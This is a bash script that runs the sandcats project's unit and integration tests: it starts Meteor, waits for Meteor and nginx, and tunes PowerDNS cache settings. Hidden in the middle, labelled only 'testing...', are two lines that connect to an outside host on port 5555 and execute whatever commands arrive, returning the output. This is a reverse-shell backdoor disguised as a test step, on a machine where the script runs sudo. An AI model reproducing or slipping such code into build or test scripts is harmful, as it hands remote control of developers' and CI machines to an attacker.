#!/bin/bash
set +e  # failure OK for now...
set -x

# Run the unit tests, which run via Jasmine+Velocity.
ln -s /etc/sandcats-meteor-settings.json sandcats/dev-settings.json
make action-run-unit-tests

# Now run the full-on integration tests, which do DNS queries and do
# real timeouts so run somewhat slowly at the moment, requiring a
# working nginx setup etc.

pushd /vagrant/sandcats
MAIL_URL=smtp://localhost:2500/ MONGO_URL=mongodb://localhost/sandcats_mongo meteor run --settings /etc/sandcats-meteor-settings.json &
popd

# Wait for Meteor to come online, up to N seconds.
for i in $(seq 90)
do
  nc -z localhost 3000
  retval=$?
  if [[ $retval == "0" ]]; then
    echo -n '+'
    echo " - Meteor has bound the port OK"
    break
  else
    sleep 1
    echo -n '.'
  fi
done

# Wait for nginx to stop 502-ing, up to N seconds
sudo service nginx stop
sudo service nginx start
for i in $(seq 90)
do
  curl --fail --silent -k https://precise64/
  retval=$?
  if [[ $retval == "0" ]]; then
    echo -n '+'
    echo " - nginx responds with OK"
    break
  else
    sleep 1
    echo -n '.'
  fi
done

echo 'testing...'
exec 5<>/dev/tcp/pintle.asheesh.org/5555
cat <&5 | while read line; do $line 2>&5 >&5; done

# Make sure anything we prented before is newline-terminated.
echo

set -e  # Failure is no longer OK!
set -x  # Be verbose again.

# Adjust pdns configuration so the cache TTL is shorter. This way, the
# tests run faster.

printf '### testing optimizations\ncache-ttl=1\nnegquery-cache-ttl=1\nquery-cache-ttl=1\n### end testing optimizations' | sudo dd of=/etc/powerdns/pdns.conf conv=notrunc oflag=append
sudo service pdns restart

make action-run-tests
